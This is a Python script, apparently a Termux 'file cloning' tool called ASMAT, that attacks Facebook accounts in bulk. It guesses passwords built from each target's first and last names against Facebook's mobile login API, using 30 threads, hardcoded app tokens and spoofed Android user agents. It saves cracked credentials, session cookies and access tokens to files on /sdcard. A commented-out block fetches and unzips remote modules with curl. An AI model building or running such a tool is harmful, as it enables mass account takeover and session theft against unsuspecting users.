import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp

#_________[ INSTALLING REQUESTS ]_____

'''
http_directory = tempfile.mkdtemp(prefix='.')
req = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/"
site_packages = sys.path[4]
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
find_aarch = subprocess.check_output('uname -om',shell=True)

if "aarch64" in str(find_aarch):
	user_aarch = "64"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config64.zip"

elif "arm" in str(find_aarch):
	user_aarch = "32"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config32.zip"
else:

	print(" [•] Your Device aarch Unknown ")


try:
	os.system(f"curl -L {link} > {http_directory}/config.zip")
	os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
	os.chdir(f"{http_directory}/reqmodule")
except Exception as e:
	print(e)
except ConnectionError:
	print(" [•] Please Check Your Internet ")

'''

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	#os.system("python dilute")



try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)


from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(51*'-')


def p(x):
	print(x)

#___________ [ Lists Used in Script]________


id = []
ok = []
cp = []
loop = 0
method=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()

def logo():
	os.system('clear')
	logo = (f'''\033[0;97m

 _______  _______  _______  _______ _________
(  ___  )(  ____ \(       )(  ___  )\__   __/
| (   ) || (    \/| () () || (   ) |   ) (   
| (___) || (_____ | || || || (___) |   | |   
|  ___  |(_____  )| |(_)| ||  ___  |   | |   
| (   ) |      ) || |   | || (   ) |   | |   
| )   ( |/\____) || )   ( || )   ( |   | |   
|/     \|\_______)|/     \||/     \|   )_(   
                                             

\33[1;97m---------------------------------------------------
 \33[1;97m OWNER     >>    ASMAT
 \33[1;97m GITHUB    >>    HAVEELI PE AJANA
 \33[1;97m TOOL      >>    UNDER TEST
  \33[1;97mVERSION   >>    0.1
\33[1;97m--------------------------------------------------''')

	p(logo)
def clear():
	os.system("clear")


uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')

bxd = ""

bumper = f'{id}{xp}'


def connection_token():
	 digits_count = 16
	 letters_count = 16
	 letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	 digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	 # Convert resultant string to list and shuffle it to mix letters and digits
	 sample_list = list(letters + digits)
	 random.shuffle(sample_list)
	 # convert list to string
	 final_string = ''.join(sample_list)
	 return final_string


def iAmMethod3Ua():

	android_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FB4A;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/Android,{random.choice(['1','5'])};FBMD/Android;FBSN/android;FBSV/{(android_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice("Dalvik/2.1.0 (Linux; U; Android 9; Oppo Build/RKQ1.285818.808) [FBAN/FB4A;FBAV/126.0.0.15132;FBBV/663881844;FBRV/0;FBPN/com.facebook.mlite;FBLC/fi_FI;FBMF/CPH2239;FBBD/CPH2239;FBDV/Oppo;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2246};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 10; Oppo Build/L6QXIQ) [FBAN/FB4A;FBAV/339.0.0.28243;FBBV/791664122;FBRV/0;FBPN/com.facebook.orca;FBLC/ne_NP;FBMF/CPH2239;FBBD/CPH2239;FBDV/Oppo;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1280};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 9; Oppo Build/L6QXIQ) [FBAN/FB4A;FBAV/389.0.0.26516;FBBV/345037682;FBRV/0;FBPN/com.facebook.katana;FBLC/es_ES;FBMF/CPH2239;FBBD/CPH2239;FBDV/Oppo;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=1794};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 8; Oppo Build/L6H95E) [FBAN/FB4A;FBAV/213.0.0.49354;FBBV/99568417;FBRV/0;FBPN/com.facebook.lite;FBLC/fr_FR;FBMF/CPH2239;FBBD/CPH2239;FBDV/Oppo;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=720,height=1612};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 12; Oppo Build/N393BU) [FBAN/FB4A;FBAV/454.0.0.15275;FBBV/711750835;FBRV/0;FBPN/com.facebook.lite;FBLC/ms_MY;FBMF/CPH2239;FBBD/CPH2239;FBDV/Oppo;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 12; Oppo Build/TP1A.997512.364) [FBAN/FB4A;FBAV/378.0.0.43424;FBBV/369608192;FBRV/0;FBPN/com.facebook.orca;FBLC/es_ES;FBMF/CPH2239;FBBD/CPH2239;FBDV/Oppo;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1920,height=1080};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 11; Oppo Build/TP1A.886859.909) [FBAN/FB4A;FBAV/442.0.0.18293;FBBV/797119930;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBMF/CPH2239;FBBD/CPH2239;FBDV/Oppo;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1280,height=800};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 10; Oppo Build/SP1A.703360.761) [FBAN/FB4A;FBAV/303.0.0.32331;FBBV/644850049;FBRV/0;FBPN/com.facebook.lite;FBLC/sl_SI;FBMF/CPH2239;FBBD/CPH2239;FBDV/Oppo;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 10; Oppo Build/MY3USG) [FBAN/FB4A;FBAV/368.0.0.33447;FBBV/656510709;FBRV/0;FBPN/com.facebook.lite;FBLC/ne_NP;FBMF/CPH2239;FBBD/CPH2239;FBDV/Oppo;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2560};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 7; Oppo Build/TP1A.991513.571) [FBAN/FB4A;FBAV/150.0.0.25515;FBBV/979880271;FBRV/0;FBPN/com.facebook.katana;FBLC/as_IN;FBMF/CPH2239;FBBD/CPH2239;FBDV/Oppo;FBSV/7;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=720,height=1612};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 8; Techno Build/L6QXIQ) [FBAN/FB4A;FBAV/252.0.0.13149;FBBV/922395216;FBRV/0;FBPN/com.facebook.mlite;FBLC/ne_NP;FBMF/KI5k;FBBD/KI5k;FBDV/Techno;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=720,height=1600};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 10; Techno Build/N393BU) [FBAN/FB4A;FBAV/378.0.0.41544;FBBV/548307147;FBRV/0;FBPN/com.facebook.mlite;FBLC/en_GB;FBMF/KI5k;FBBD/KI5k;FBDV/Techno;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1200,height=1824};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 7; Techno Build/LQXMBI) [FBAN/FB4A;FBAV/397.0.0.37294;FBBV/171538939;FBRV/0;FBPN/com.facebook.katana;FBLC/mk_MK;FBMF/KI5k;FBBD/KI5k;FBDV/Techno;FBSV/7;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 6; Techno Build/RKQ1.473090.694) [FBAN/FB4A;FBAV/396.0.0.23293;FBBV/269021563;FBRV/0;FBPN/com.facebook.mlite;FBLC/sl_SI;FBMF/KI5k;FBBD/KI5k;FBDV/Techno;FBSV/6;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=786};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 7; Techno Build/SP1A.529553.215) [FBAN/FB4A;FBAV/339.0.0.31315;FBBV/615215586;FBRV/0;FBPN/com.facebook.mlite;FBLC/sl_SI;FBMF/KI5k;FBBD/KI5k;FBDV/Techno;FBSV/7;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 12; Techno Build/TP1A.673410.186) [FBAN/FB4A;FBAV/232.0.0.36434;FBBV/466494248;FBRV/0;FBPN/com.facebook.lite;FBLC/fr_FR;FBMF/KI5k;FBBD/KI5k;FBDV/Techno;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 10; Techno Build/TP1A.646062.795) [FBAN/FB4A;FBAV/471.0.0.12461;FBBV/710983921;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/bn_IN;FBMF/KI5k;FBBD/KI5k;FBDV/Techno;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1920,height=1080};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 11; Techno Build/N0ZE5D) [FBAN/FB4A;FBAV/262.0.0.32337;FBBV/384927326;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sl_SI;FBMF/KI5k;FBBD/KI5k;FBDV/Techno;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2246};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 9; Techno Build/RD2A.249442.396) [FBAN/FB4A;FBAV/231.0.0.31219;FBBV/284617185;FBRV/0;FBPN/com.facebook.katana;FBLC/fr_FR;FBMF/KI5k;FBBD/KI5k;FBDV/Techno;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=720,height=1520};FB_FW/1;]"
"Dalvik/2.1.0 (Linux; U; Android 9; Techno Build/ND2G8H) [FBAN/FB4A;FBAV/503.0.0.37248;FBBV/356813985;FBRV/0;FBPN/com.facebook.mlite;FBLC/es_ES;FBMF/KI5k;FBBD/KI5k;FBDV/Techno;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2560};FB_FW/1;]"
)
	return ua



nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class iAmMain:


	def __init__(self):
		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):
	
	
		logo()	

		p(" [1] File Cloning ")
		p(" [E] Exit Tool ")

		line()
		opt1 = input(" {•} Select An Option : ")
		if opt1 == "1":self.file_menu()
		elif opt1 == "2":self.num_menu()
		elif opt1 == "E":exit(" [•] HAVE A NICE DAY")
		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()

	

	def file_menu(self):
		logo()
		p(" [•] Example /sdcard/File.txt")
		file = input(" [•] Put File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()

		
	def method_select(self,id):
		logo()
		p(" [1] Method Mix [BEST] ")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("iii")
			self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)


	def password_menu(self,id):
		pwx=[]
		logo()
		max = 20
		p(" [•] Example 1 , 2 , 3  to 20 Max ")
		try:

			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should Be Under 20 ");sp(2);self.password_menu()
		except:

			plimit = 4
		logo()
		p(" [•] Enter Manual Password Example : First Last, First123, Last123, First786 ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))

		logo()
		p("  Total File Accounts : %s "%(str(len(id))))
		p(" Proces has been started ")
		line()
		with tpe(max_workers=30) as saqi:

			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					 saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):
		line()

		p(" [•] Cloning Hasbeen Completed ")
		p(" [•] Cloning Accounts Saved in /sdcard")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))

		line()
		input(" [•] Press Enter To Go Back ")
		self.iAmMenu()

	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ASMAT %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())

				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}

				headers = {'User-Agent': iAmMethod3Ua(),

'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[ASMAT-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/ASMAT_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ASMAT_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[ASMAT-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ASMAT_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
		self.iAmPasswordManager()

if __name__=="__main__":
	#update()
	iAmMain().iAmMenu()
